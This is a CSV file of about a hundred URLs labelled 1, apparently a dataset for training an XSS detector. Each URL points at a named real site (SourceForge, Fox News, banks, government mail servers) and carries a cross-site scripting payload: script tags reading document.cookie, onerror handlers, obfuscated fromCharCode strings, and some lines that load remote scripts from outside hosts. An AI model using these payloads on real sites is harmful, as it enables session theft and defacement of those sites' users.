Sentence,Label
http://sourceforge.net/softwaremap/trove_list.php?form_cat=18&amp;form_cat=18&amp;stquery=%3c%22%3c%3cscript<br>%3ealert%28document.cookie%29%3c%2fscript%3e%3c%22%3c%3cscript%3ealert%28document.cookie%29%3c%2fscr<br>ipt%3e%3c%22%3c%3cscript%3ealert%28document.cookie%29%3c%2fscript%3e%3c%22%3c%3cscript%3ealert%28doc<br>ument.cookie%29%3c%2fscript%3e%3c%22%3c%3cscript%3ealert%28document.cookie%29%3c%2fscript%3e%3c%22%3<br>c%3cscript%3ealert%28document.cookie%29%3c%2fscript%3e%3c%22%3c%3cscript%3ealert%28document.cookie%2<br>9%3c%2fscript%3e%3c%22%3c%3cscript%3ealert%28document.cookie%29%3c%2fscript%3e&amp;stquery=%3c%22%3c%3cs<br>cript%3ealert%28document.cookie%29%3c%2fscript%3e%3c%22%3c%3cscript%3ealert%28document.cookie%29%3c%<br>2fscript%3e%3c%22%3c%3cscript%3ealert%28document.cookie%29%3c%2fscript%3e%3c%22%3c%3cscript%3ealert%<br>28document.cookie%29%3c%2fscript%3e%3c%22%3c%3cscript%3ealert%28document.cookie%29%3c%2fscript%3e%3c<br>%22%3c%3cscript%3ealert%28document.cookie%29%3c%2fscript%3e%3c%22%3c%3cscript%3ealert%28document.coo<br>kie%29%3c%2fscript%3e%3c%22%3c%3cscript%3ealert%28document.cookie%29%3c%2fscript%3e&amp;search=search+re<br>sults,1
http://perlqt.sourceforge.net/index.php?page=%27%3b%61%6c%65%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%<br>6d%43%68%61%72%43%6f%64%65%28%38%38%2c%38%33%2c%38%33%29%29%2f%2f%5c%27%3b%61%6c%65%72%74%28%53%74%7<br>2%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%38%38%2c%38%33%2c%38%33%29%29%2f%2f%22%3b%61%6c<br>%65%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%38%38%2c%38%33%2c%38%33%29%<br>29%2f%2f%5c%22%3b%61%6c%65%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%38%3<br>8%2c%38%33%2c%38%33%29%29%2f%2f%2d%2d%3e%3c%2f%53%43%52%49%50%54%3e%22%3e%27%3e%3c%53%43%52%49%50%54<br>%3e%61%6c%65%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%38%38%2c%38%33%2c%<br>38%33%29%29%3c%2f%53%43%52%49%50%54%3e,1
http://sourceforge.net/project/mirror_picker.php?height=350%22%3cimg%20src=k.png%20onerror=alert(%22<br>xss%22)%20/%3e&amp;width=300&amp;group_id=151265%22%3cimg%20src=k.png%20onerror=alert(%22xss%22)%20/%3e&amp;use_<br>mirror=puzzle&amp;filesize=&amp;filename=mplayer_portable_1.0_rc2.paf.exe%22%3cimg%20src=k.png%20onerror=ale<br>rt(123)%20/%3e%22%3ciframe%20src=&amp;abmode=%22%3cimg%20src=k.png%20onerror=alert(123)%20/%3e,1
http://gnu-darwin.sourceforge.net/index.php?page=%3c/title%3e%3cscript%3ealert(%22vulnerabilit%e0%20<br>xss.%20by%20nakky%ae%22);%3c/script%3e,1
http://codestriker.sourceforge.net/cgi-bin/codestriker.pl?topic=6820609&amp;action=view&amp;mode=%22%3e%3csc<br>ript%3ealert%28document.cookie%29%3c/script%3e&amp;fview=-%22%3e%3cscript%3ealert%28document.cookie%29%3<br>c/script%3e,1
http://ssic-linux.sourceforge.net/cgi-bin/view?page=seeme%20-%20%3cscript%3ealert%28document.cookie%<br>29%3c/script%3e,1
http://asc-hq.sourceforge.net/show.php?id=58%3cscript%3ealert%28document.cookie%29%3c/script%3e,1
http://qdig.sourceforge.net/qdig/qdig-demo2/index-dark.php/&quot;&gt;&lt;script&gt;alert('xss by<br>atm0n3r')&lt;/script&gt;,1
http://pisg.sourceforge.net/index.php?page=examples&lt;/title&gt;&lt;!-- --&gt;&lt;body onload=alert(1);&gt;&lt;/iframe<br>src=http://google.com&gt;--&gt;,1
http://xesearch-int.xe.com/find.html?id=78955197&amp;pageid=r&amp;mode=all&amp;nsb=true%22%3e%3cscript%3ealert%2<br>8document.cookie%29%3c/script%3e&amp;n=0&amp;query=xss&amp;q=%3cscript%3ealert%28document.cookie%29%3c%2fscript%<br>3e&amp;type=xe.com &lt;- xss&amp;script insertion,1
http://jisoengine.sourceforge.net/q.php?q=404&amp;req=overview/&quot;&gt;&lt;script&gt;alert('xss by<br>atm0n3r')&lt;/script&gt;,1
http://www.iby-bank.com/eng/send.asp?page=e-banking.asp&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt; <br>&lt;- bank of yemen,1
http://cms.bbb.org/wwwroot/search.aspx?site=0&amp;s=xss%22%3e%3cscript%3ealert%28document.cookie%29%3c/s<br>cript%3e,1
http://sandiego.bbb.org/wwwroot/search.aspx?site=26&amp;s=xss%22%3e%3cscript%3ealert%28document.cookie%2<br>9%3c/script%3e &lt;- affects all bbb sites,1
http://www.tagged.com/profile.html?view=mini&amp;uid=1101376&amp;paramstr=%26gender%3db%26min_age%3d18%26max<br>_age%3d-1%26country%3dus%26distance%3d0%26location%3d%26location_nd%3d%26language%3d-1%26show%3d25%2<br>6rel_status%3d0%26interested_in%3d0%26sexual_orientation%3d0%26ethnicity%3d0%26religion%3d0&amp;searchha<br>sh=_b_18_-1_us_0___undefined_-1_25_0_0_0_0_0_keyword__0_-1_-1_-1_0_1%22%3e%3cscript%3ealert(%27xss%2<br>7)%3c/script%3e&amp;isbrowse=1&amp;useroffset=1 &lt;- xss in user profiles. theres only a script insertion<br>available.,1
http://search.brothersoft.com/script-alert-xss-script/?stype=windows&quot;&gt;&lt;script&gt;alert('xss')&lt;/script&gt;,1
http://newyork.bbb.org/wwwroot/search.aspx?site=24&amp;s=xss%22%3e%3cscript%3ealert%28document.cookie%29<br>;%3c/script%3e,1
http://theworldsearch.brothersoft.com/result.php?cx=011890932829907930945%3ajynxbnokunu%22%3e%3cscri<br>pt%3ealert%28document.cookie%29%3c/script%3e&amp;type=1&amp;cof=forid%3a11&amp;ie=utf-8&amp;q=%3cscript%3ealert%281%<br>29%3c%2fscript%3e&amp;sa=search&amp;siteurl=theworldsearch.brothersoft.com%252f&amp;siteurl=theworldsearch.broth<br>ersoft.com%252f,1
http://mail.lzsafety.gov.cn:6080/badlogin.php?tid=0&amp;retid=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;<br>p+,1
http://www.cne.gov.co/cne/index.jsp?option=%22%3e%3cscript%3ealert%28document.cookie%29%3c/script%3e,1
http://ntr.ticketmaster.com/ntw/forward?from=--&gt;&quot;&gt;&lt;script<br>src=http://vuln.xssed.net/thirdparty/scripts/ckers.org.js&gt;&lt;/script&gt;,1
http://www.procuraduria.gov.co/portal/index.jsp?option=%22%3e%3cscript%3ealert%28document.cookie%29%<br>3c/script%3e,1
http://www.tmb.in/site_search/our_internal_site_search.html?search_text=%22%3e%3cscript%3ealert%28%2<br>2+xssed+by+snypter%22%29%3c%2fscript%3e&amp;x=0&amp;y=0&amp;searchtype=site,1
http://www.italia.gov.it/itagov2/content/cerca-i-servizi-online?param3=lavoro'%20%3cscript%3ealert(d<br>ocument.cookie);%3c/script%3e,1
http://calendar.columbia.edu/sundial/webapi/get.php?viewtype=%22%3e%3cscript%3ealert%28document.cook<br>ie%29%3c/script%3e,1
http://www.artvin-cevreorman.gov.tr/test/index.php?git=sayfa&amp;id=&lt;iframe%20src=&quot;http://www.xssed.com&quot;<br>&gt;,1
http://www.diyarbakir-cevreorman.gov.tr/diyar/resim.php?resimno=&lt;script&gt;alert(1)&lt;/script&gt;&lt;iframe%20s<br>rc=&quot;http://www.xssed.com&quot;&gt;,1
http://www.yola.com/login?login-success_url=%22%3e%3ciframe%20src=%22http://xssed.com%22%3e,1
"http://sgb.bayindirlik.gov.tr/giris.aspx?__lastfocus=111-222-1933email@address.tst&amp;__viewstate=%2fwe<br>pdwullte4mtqxnzk0nzypzbycagmpzbygagepfgiea3nyywuhqxbwx3rozw1lcy9uagvtztevaw1hz2vzl2xvz28uz2lmzaidd2q<br>wagibdw8wah4evgv4daugqkfzsu5esvjmsusgvkugxlbts0foiejbs0fotenenklkzaixdw8wah8bbq4xljaumzm1ns4ymzu1nwr<br>kgaefhl9fq29udhjvbhnszxf1axjlug9zdejhy2tlzxlfxxybbqpjagtiyxrpcmxhoes%2fk8%2fdxmhp1mdpy8h%2fdaki%2bmw<br>%3d&amp;txtkkod=%3cimg%20src%3d%22javas%26%2399%3bript:alert%2840014,9080338542%29%3b%22%3e&amp;txtparola=11<br>1-222-1933email@address.tst&amp;chkhatirla=on&amp;btngiris=&gt;&quot;&gt;&lt;script%20%0a%0d&gt;alert(/xss%20by%20turkpower%2<br>0-%20from%20turkey/)%3b&lt;/script&gt;&lt;h1&gt;xss%20by%20turkpower%20-%20admin%20kardes%20lutfen%20devlet%20si<br>telerinde%20daha%20dikkatli%20ol%20&lt;/h1&gt;",1
http://www.gpcongress.gov.ly/docs/index.php?select=%3cbody%20onload%3dprompt%28964650%29%3e&amp;select2=<br>1&amp;select3=1369&amp;submit=%26%231593%3b%26%231585%3b%26%231590%3b,1
http://ncbolabs-dev1.stanford.edu:8080/parsetrees/execute.jsp?query=%22%3e%3cbody%20background=%22ht<br>tp://www.lenagold.ru/fon/eda/shoko/shoko14.gif%22%3e%3cscript%3ealert%28%22hmm..chocolate.%20xss%20b<br>y%20sony%22%29%3c/script%3e%3ciframe%20width=%22520%22%20height=%22415%22%20src=%22http://www.youtub<br>e.com/embed/5c24grhhfy0%22%20frameborder=%220%22%20allowfullscreen%3e%3c/iframe%3e&amp;type=string,1
http://geoliss.ekoplan.gov.rs/index.php?page=projekti/&quot;&gt;&lt;script&gt;alert('xss by<br>atm0n3r')&lt;/script&gt;&lt;script type=&quot;text/javascript&quot;<br>src=&quot;http://yourjavascript.com/27544112151/xss.atmon3r.js&quot;&gt;&lt;/script&gt;,1
http://www.drdjs-nordpasdecalais.jeunesse-sports.gouv.fr/find.asp?find=/&quot;&gt;&lt;script&gt;alert('xss by<br>atm0n3r')&lt;/script&gt;&amp;x=11&amp;y=8,1
http://www.statistiques.developpement-durable.gouv.fr/accueil/recherche-avancee/resultats-recherche.<br>html?id=4&amp;no_cache=1&amp;tx_solr[q]=/&quot;&gt;&lt;script&gt;alert('xss by atm0n3r')&lt;/script&gt;&amp;search=ok,1
http://ilsearch.rediff.com/ilsearch/default.asp?mt=/&quot;&gt;&lt;script&gt;alert('xss by<br>atm0n3r')&lt;/script&gt;&amp;mteng=xss&amp;prefilldata=[[/&quot;&gt;&lt;script&gt;alert('xss by<br>atm0n3r')&lt;/script&gt;]]&amp;language=hindi,1
http://hypernews.slac.stanford.edu/hypernews/geant4/view-members.pl?page=2%22%3e%3cbody%20background<br>=%22http://www.lenagold.ru/fon/ani/cat/raz/razcat34.jpg%22%3e%3cscript%3ealert%28%22xss%22%29%3c/scr<br>ipt%3e%3ciframe%20width=%22420%22%20height=%22315%22%20src=%22http://www.youtube.com/embed/qh2-tgulw<br>u4%22%20frameborder=%220%22%20allowfullscreen%3e%3c/iframe%3e&amp;find=^b,1
"http://www.haenam.go.kr/home/www/sub_participation/board/?view=';alert(string.fromcharcode(88,83,83)<br>)//\';alert(string.fromcharcode(88,83,83))//&quot;;alert(string.fromcharcode(88,83,83))//\&quot;;alert(string.<br>fromcharcode(88,83,83))//--&gt;&lt;/script&gt;&quot;&gt;'&gt;&lt;script&gt;alert(string.fromcharcode(88,83,83))&lt;/script&gt;",1
http://www.hsbcculturalexchange.com/thumbnail.php?image=&gt;&quot;&gt;&lt;script%20%0a%0d&gt;alert(/xss%20by%20turkpo<br>wer%20-%20from%20turkey/)%3b&lt;/script&gt;&lt;h1&gt;xss%20by%20turkpower%20-%20from%20turkey&lt;/h1&gt;&lt;/marquee&gt;,1
http://www.renault.com.ve/gama_modelo.php?id=%22%3e%3cscript%3ealert(/%27drksnix%27/)%3c/script%3e,1
http://www.michelin.no/no/auto/auto_ts.jsp?marque=&gt;&quot;&gt;&lt;script%20%0a%0d&gt;alert('xss%20by%20turkpower%20<br>-%20canim%20turkiyem')%3b&lt;/script&gt;&lt;h1&gt;xss%20by%20turkpower&lt;/h1&gt;&lt;/marquee&gt;,1
http://www.michelin.ro/ro/front/search.jsp?query=cautare%2e%2e%2e&amp;lang=&gt;&quot;&gt;&lt;script%20%0a%0d&gt;alert('xs<br>s%20by%20turkpower%20-%20canim%20turkiyem')%3b&lt;/script&gt;&lt;h1&gt;xss%20by%20turkpower&lt;/h1&gt;&lt;/marquee&gt;,1
http://www.michelin.dk/dk/auto/auto_ts.jsp?marque=&gt;&quot;&gt;&lt;script%20%0a%0d&gt;alert('xss%20by%20turkpower%20<br>-%20canim%20turkiyem')%3b&lt;/script&gt;&lt;h1&gt;xss%20by%20turkpower&lt;/h1&gt;&lt;/marquee&gt;,1
http://www.michelin.ru/ru/auto/auto_ts.jsp?marque=&gt;&quot;&gt;&lt;script%20%0a%0d&gt;alert('xss%20by%20turkpower%20<br>-%20canim%20turkiyem')%3b&lt;/script&gt;&lt;h1&gt;xss%20by%20turkpower&lt;/h1&gt;&lt;/marquee&gt;,1
http://www.michelin.nl/nl/front/search.jsp?lang=&gt;&quot;&gt;&lt;script%20%0a%0d&gt;alert('xss%20by%20turkpower%20-%<br>20canim%20turkiyem')%3b&lt;/script&gt;&lt;h1&gt;xss%20by%20turkpower&lt;/h1&gt;&lt;/marquee&gt;,1
http://www.michelin.se/se/auto/auto_ts.jsp?marque=&gt;&quot;&gt;&lt;script%20%0a%0d&gt;alert('xss%20by%20turkpower%20<br>-%20canim%20turkiyem')%3b&lt;/script&gt;&lt;h1&gt;xss%20by%20turkpower&lt;/h1&gt;&lt;/marquee&gt;,1
http://www.michelin.fi/fi/auto/auto_ts.jsp?marque=&gt;&quot;&gt;&lt;script%20%0a%0d&gt;alert('xss%20by%20turkpower%20<br>-%20canim%20turkiyem')%3b&lt;/script&gt;&lt;h1&gt;xss%20by%20turkpower&lt;/h1&gt;&lt;/marquee&gt;,1
http://domains.cybex.gr/check.asp?domain=%3cscript%3ealert%28document.cookie%29%3c/script%3e,1
http://panorama.ert.gr/archive/31th/31th.asp?id=dsl.wmv&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,1
http://pub.kathimerini.gr/?keyword=aaaa&lt;script&gt;alert(document.cookie)&lt;/script&gt;&amp;edition=kath&amp;from=&amp;to<br>=&amp;cat=all,1
http://vod.grnet.gr/vod/users/searchindex.jsp?field1=au&amp;term1=&lt;script&gt;alert(document.cookie)&lt;/script<br>&gt;&amp;max=,1
http://www.antenna.gr/webtv/register?ref=http://www.antenna.gr/tv/default.aspx'&quot;&gt;&lt;script&gt;alert(docum<br>ent.cookie)&lt;/script&gt;,1
http://www.attijaribank.com.tn/attijari/site/viewarticle.jsp?id=%60%27%22%22%22%3e%3cscript%3ealert%<br>28%27xss%27%29;%3c/script%3e,1
http://www.tomshw.it/news_site.php?sezione=%22%3e%3cscript%3ealert(/hani/)%3c/script%3e,1
http://www2.beppegrillo.it/v2day/vmarcia/vmarcia.php?avatar=123%22%3e%3cscript%3ealert(/xss/)&lt;/scrip<br>t&gt;,1
http://www.leoncountyfl.gov/admin/press/searchlist.asp?city=1&amp;sheriff=1&amp;beg_date=01%2f01%2f2006&amp;titl<br>e=1&amp;phrase=%27%22%3e%3c%2ftitle%3e%3cscript%3ealert(1337)%3c%2fscript%3e%3e%3cmarquee%3e%3ch1%3exss+<br>by+xylitol%3c%2fh1%3e%3c%2fmarquee%3e&amp;xsubmit=search%3a,1
https://jobopportunities.ferroviedellostato.it/curr-on-line/initcurrservice?codscta=0004.%22%3cscrip<br>t%3ealert(123)%3c/script%3e,1
http://www.alfaromeo.it/cgi-bin/pbrand.dll/newalfa_italia/faq%3cscript%3ealert(/xss/)%3c/script%3e,1
http://search2.foxnews.com/search?ie=utf-8&amp;oe=utf-8&amp;client=my_frontend&amp;proxystylesheet=my_frontend&amp;o<br>utput=xml_no_dtd&amp;site=story&amp;getfields=*&amp;filter=0&amp;sort=date%3ad%3as%3ad1&amp;q=%3c%2fscript%3e%3cscript%3<br>ealert%28%27xss%27%29%3c%2fscript%3e&amp;qstr=&amp;realm=fnc&amp;random=,1
http://www.foxnews.com/cgi-bin/email.cgi?url=&quot;&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;,1
http://www.foxnews.com/search-results/search?q=&lt;/script&gt;&lt;iframe src=&quot;http://xssed.com&quot;&gt;&lt;/iframe&gt;,1
http://www.nic.it/sr?set_language=vas%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e,1
http://www.wcheshirepct.nhs.uk/default.asp?page=search.asp&amp;searchterm=&lt;script&gt;alert(&quot;virtual_system&quot;<br>)&lt;/script&gt;,1
http://blog.addthis.com/?p=%22%3cscript%3ealert(1)%3c/script%3e&amp;paged=2,1
http://www.addthis.com/bookmark.php?v=12&amp;winname=addthis&amp;pub=wiseassoffice&amp;s=&amp;url=http%253a%252f%252<br>fwww.noheat.com%252f2007%252f11%252f30%252fgreat-wallpaper-for-vista-or-xp%252f&amp;title=&quot;&gt;&lt;script&gt;aler<br>t('trex')&lt;/script&gt;,1
http://api.addthis.com/oexchange/0.8/forward/squidoo/offer?scraped=true&amp;url=&quot;&gt;&lt;script&gt;alert('trainre<br>q');&lt;/script&gt;,1
http://www.addthis.com/landing?to=ffext&amp;utm_source=ps&amp;utm_medium=img&amp;utm_content=atff&amp;utm_campaign=a<br>tspf4_dl');alert(0);//,1
http://www.performans.saglik.gov.tr/index.php?pid=54&amp;a=%22%3e%3cscript%3ealert(%22virtual_system%22)<br>%3c/script%3e,1
http://store.apple.com/us/search?find=%27%22%3e%3c%2ftitle%3e%3cscript%3ealert(1337)%3c%2fscript%3e%<br>3e%3cmarquee%3e%3ch1%3exss+by+xylitol%3c%2fh1%3e%3c%2fmarquee%3e,1
https://www.anz.com/inetbank/importantinformation.asp?affid=&quot;/&gt;&lt;script&gt;alert(1);&lt;/script&gt;,1
http://innovator.samsungmobile.com/down/cnts/toolsdk.detail.view.do?platformid=1&amp;cntsid=9999&amp;nacode=<br>%22%3e%3c/title%3e%3cscript%3ealert%28%22who%20fixed%20my%20art?%20by%20sony%22%29%3c/script%3e%3cst<br>yle%3ebody{visibility:hidden;}%20html{background-image:%20url%28http://www.lenagold.ru/fon/ori/sneg/<br>snow29.gif%29;}%3c/style%3e%27%22%3e%3cdiv%20style=%22position:%20absolute;left:%20420px;top:%2040px<br>;%e2%80%8b%e2%80%8bz-index:%2010;visibility:%20visible;%20color:%20white;%20font-size:%2040px;%22%3e<br>%3cimg%20src=%22http://i1.giftube.ru/multjashki/kot_vygljadyvaet_927ccf5f2ff24217ac6dd26dceed075a.gi<br>f%22%20style=%22height:%20184px;%20width:%20243px;%22%20alt=%22by%20sony%22%3e%3ciframe%20width=%224<br>20%22%20height=%22315%22%20src=%22http://www.youtube.com/embed/boakprzrkpi%22%20frameborder=%220%22%<br>20allowfullscreen%3e%3c/iframe%3e,1
http://aps2.toshiba-tro.de/bluetooth/pages/disclaimer.php?dt=bts&amp;download=%22%3e%3cscript%3ealert%28<br>document.cookie%29%3c/script%3e,1
http://mail.nbbc.gov.cn:6080/badlogin.php?tid=0&amp;lid=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;p+,1
http://openfeint.com/ios?search[order]=&amp;search[title_like]=%3cscript%3ealert%28document.cookie%29%0a<br>%3c/script%3e&amp;search[ios_is]=1&amp;commit=search,1
http://marketing.philly.monster.com/send/?url=%22%3e%3cscript%3ealert%28document.cookie%29%3c/script<br>%3e,1
http://www.szsmb.gov.cn:6080/badlogin.php?tid=0&amp;lid=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;p+,1
http://www.sahvet.gov.cn/mail/badlogin.php?tid=0&amp;lid=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;p+,1
http://mail.lfdz.gov.cn:6080/badlogin.php?tid=0&amp;lid=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;p+,1
http://mail.lngeo.gov.cn/badlogin.php?tid=0&amp;retid=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;p+,1
http://mail.tjsw.gov.cn/badlogin.php?tid=0&amp;retid=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;p+,1
http://cdmail.cdeic.gov.cn/badlogin.php?tid=0&amp;lid=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;p+,1
http://www.gxinfo.gov.cn:3000/badlogin.php?tid=0&amp;lid=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;p+,1
http://www.gz12358.gov.cn:2004/www/badlogin.php?tid=0&amp;lid=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;<br>p+,1
http://mail.zjport.gov.cn/badlogin.php?tid=0&amp;lid=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;p+,1
http://mail.lyls.gov.cn/badlogin.php?tid=0&amp;lid=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;p+,1
http://mail.lnnet.gov.cn/badlogin.php?tid=0&amp;retid=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;p+,1
http://mail.guilin.gov.cn/badlogin.php?tid=0&amp;retid=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;p+,1
http://mail.qjzx.gov.cn/badlogin.php?tid=0&amp;lid=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;p+,1
http://www.michelin.pl/pl/auto/auto_ts.jsp?marque=&gt;&quot;&gt;&lt;script%20%0a%0d&gt;alert('xss%20by%20turkpower%20<br>-%20canim%20turkiyem')%3b&lt;/script&gt;&lt;h1&gt;xss%20by%20turkpower&lt;/h1&gt;&lt;/marquee&gt;,1
http://www.fzkj.gov.cn:8383/badlogin.php?tid=0&amp;lid=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;p+,1
http://www.expedia.de/pub/agent.dll?qscr=redr&amp;rurl=http://s5.tinypic.com/2pzcgty.jpg,1
http://webinfo.parl.gc.ca/membersofparliament/quicksearch.aspx?searchterm=%3cscript%3ealert%28%22mod<br>akabam%22%29%3c/script%3e,1
http://www.best.go.tz/news.asp?letter=%3cscript%3ealert%28document.cookie%29%3c/script%3e,1
http://www.lidl-shop.de/de/shop@searchresultspage?querystring=&amp;pagerange=&quot;&gt;&lt;script&gt;alert(document.co<br>okie)&lt;/script&gt;,1
"http://www.legis.state.ga.us/legis/2009_10/billsearch.php?hbmax=1721&amp;hrmax=1721&amp;sbmax=1721&amp;srmax=172<br>1&amp;billtype=hb&amp;billnumber=%27;alert(string.fromcharcode(88,83,83))//%5c%27;alert(string.fromcharcode(<br>88,83,83))//%22;alert(string.fromcharcode(88,83,83))//%5c%22;alert(string.fromcharcode(88,83,83))//-<br>-%3e%3c/script%3e%22%3e%27%3e%3cscript%3ealert(string.fromcharcode(88,83,83))%3c/script%3e",1
http://www.nod32.se/t_product_view.php?product_id=&quot;&gt;&lt;script%20%0a%0d&gt;alert(41551.8863228704)%3b&lt;/scr<br>ipt&gt;,1
"http://digilib.litbang.depkes.go.id/search.php?s=dc_person&amp;frm[tag][]=fullname&amp;frm[q][]=';alert(stri<br>ng.fromcharcode(88,83,83))//\';alert(string.fromcharcode(88,83,83))//&quot;;alert(string.fromcharcode(88,<br>83,83))//\&quot;;alert(string.fromcharcode(88,83,83))//--&gt;&lt;/script&gt;&quot;&gt;'&gt;&lt;script&gt;alert(string.fromcharcode(<br>88,83,83))&lt;/script&gt;&amp;frm[bol][]=and&amp;frm[tag][]=fullname&amp;frm[q][]=&amp;frm[bol][]=and&amp;frm[tag][]=fullname&amp;<br>frm[q][]=&amp;frm[bol][]=and&amp;frm[tag][]=fullname&amp;frm[q][]=&amp;frm[bol][]=and&amp;frm[tag][]=fullname&amp;frm[q][]=&amp;<br>frm[bol][]=and&amp;frm[tag][]=fullname&amp;frm[q][]=&amp;frm[bol][]=and&amp;frm[tag][]=fullname&amp;frm[q][]=&amp;frm[bol][]<br>=and&amp;b=search",1
http://www.udskior.gov.pl/index.php?fraza=&lt;/style&gt;&lt;script&gt;a=eval;b=alert;a(b(/alert!!!!/.source));&lt;/<br>script&gt;'&quot;&gt;&lt;marquee&gt;&lt;h1&gt;vir0e5 --------&gt; xss bug<br>detected&lt;/h1&gt;&lt;/marquee&gt;&lt;script&gt;a=eval;b=alert;a(b(/banditc0de xss/.source));&lt;/script&gt;,1
http://www.bebo.com/search.jsp?searchterm=%22%3e%3cscript%3ealert%28%27nullflow%27%29%3c%2fscript%3e<br>&amp;searchtype=people,1
http://slashdot.org/index2.pl?fhfilter=&lt;/script&gt;&lt;script<br>src=http://vuln.xssed.net/thirdparty/scripts/ckers.org.js&gt;&lt;/script&gt;,1
http://www.bebo.com/link.jsp?&lt;script<br>src=http://vuln.xssed.net/thirdparty/scripts/ckers.org.js&gt;&lt;/script&gt;url=http%3a%2f%2fr3t%2en3t%2enl,1
https://secure.bebo.com/jsredirect.jsp?location=%3c/script%3e%3cscript%3ewindow.location%3d%28%27htt<br>p%3a//www.xssed.com%27%29%3c/script%3e,1
http://www.n24.de/service/suche/index.php?search=%22%29%3b%3c%2fscript%3e%3cscript%3ealert%281%29%3b<br>%3c%2fscript%3e&amp;x=9&amp;y=13,1
"http://store.ferrari.com/en/searchresult=%22%3ediv%20style=%22text-align:%20center;%22%3e%3cp%20styl<br>e=%22font-family:%20verdana;%20font-style:normal;%20font-variant:%20normal;%20font-weight:%20bold;%2<br>0font-size:%2036px;%20line-height:normal;%20font-size-adjust:%20none;%20font-stretch:%20normal;%20co<br>lor:%20rgb%28255,%200,%200%29;%22%3esite%20vulnerable%3c/p%3e%3cimg%20src=%22http://img485.imageshac<br>k.us/img485/1011/hackednm5.jpg%22border=%220%22%3e%3cp%20style=%22font-family:%20arial;%20font-style<br>:%20italic;%20font-variant:%20normal;font-weight:%20normal;%20font-size:%2012px;%20line-height:%20no<br>rmal;%20font-size-adjust:%20none;font-stretch:%20normal;%20color:%20rgb%28221,%20221,%20221%29;%22%3<br>exss%20attack%20example%3c/p%3e%3c/div%3e",1
